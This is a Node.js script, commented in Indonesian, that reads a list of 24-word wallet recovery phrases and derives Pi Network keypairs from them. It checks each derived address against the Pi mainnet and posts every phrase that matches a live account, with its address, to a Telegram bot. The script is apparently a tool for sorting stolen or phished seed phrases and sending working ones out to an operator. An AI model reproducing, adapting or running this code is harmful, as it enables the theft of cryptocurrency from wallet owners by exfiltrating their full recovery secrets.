const fs = require('fs');
const axios = require('axios');
const bip39 = require('bip39');
const edHd = require('ed25519-hd-key');
const StellarSdk = require('stellar-sdk');

// Ganti dengan token dan ID chat bot Telegram kamu
const TELEGRAM_TOKEN = 'ISI_TOKEN_TELEGRAM_KAMU';
const TELEGRAM_CHAT_ID = 'ISI_CHAT_ID_KAMU';

// Setup Stellar server
const server = new StellarSdk.Server('https://api.mainnet.minepi.com');
const Keypair = StellarSdk.Keypair;

// Fungsi mengubah mnemonic menjadi keypair Stellar
function mnemonicToStellarKeypair(mnemonic) {
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const { key } = edHd.derivePath("m/44'/314159'/0'", seed); // Path Pi Network
  return Keypair.fromRawEd25519Seed(key);
}

// Fungsi kirim ke Telegram
async function sendToTelegram(message) {
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });
  } catch (err) {
    console.error("⚠️ Gagal kirim ke Telegram:", err.message);
  }
}

// Membaca file dan filter hanya mnemonic 24 kata
const mnemonics = fs.readFileSync('pharses.txt', 'utf8')
  .split('\n')
  .map(line => line.trim())
  .filter(line => line.split(' ').length === 24);

// Kosongkan isi file output
fs.writeFileSync('valid.txt', '');
fs.writeFileSync('invalid.txt', '');

// Proses semua mnemonic
async function checkMnemonics(list) {
  for (const mnemonic of list) {
    try {
      const keypair = mnemonicToStellarKeypair(mnemonic);
      const pubkey = keypair.publicKey();

      await server.loadAccount(pubkey);

      console.log(`✅ Terdaftar: ${pubkey}`);
      fs.appendFileSync('valid.txt', mnemonic + '\n');

      const message = `✅ *Mnemonic valid & terdaftar:*\n\`\`\`\n${mnemonic}\n\`\`\`\n🔐 *Address:* \`${pubkey}\``;
      await sendToTelegram(message);

    } catch (err) {
      if (err.response && err.response.status === 404) {
        console.log(`❌ Tidak terdaftar: ${mnemonic}`);
        fs.appendFileSync('invalid.txt', mnemonic + '\n');
      } else {
        console.error(`⚠️ Error pada mnemonic: ${mnemonic}`);
        console.error(err.message);
      }
    }
  }
}

checkMnemonics(mnemonics);
